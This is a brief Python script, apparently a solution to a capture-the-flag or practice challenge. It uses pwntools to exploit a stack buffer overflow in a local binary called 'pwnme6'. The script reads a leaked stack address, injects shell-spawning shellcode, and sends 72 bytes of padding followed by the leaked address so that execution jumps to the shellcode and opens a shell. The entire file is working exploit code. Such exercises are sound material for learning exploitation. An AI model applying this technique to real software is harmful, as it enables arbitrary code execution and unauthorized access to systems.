import pwn
from templates import buff_overflow


def main():
    # start up the binary
    pwn.context.arch = 'amd64'
    proc = pwn.process('./pwnme6')

    # make the shellcode, and then inject onto the top of the stack
    shell_code = pwn.asm(pwn.shellcraft.sh())
    proc.recvuntil(b"I am so poorly fortified: 0x")
    leak = proc.recvline()
    proc.sendline(shell_code)

    payload = b"a" * 72 + pwn.p64(int(leak, 16))
    buff_overflow(
        payload,
        proc,
        interactive=False
    )


main()
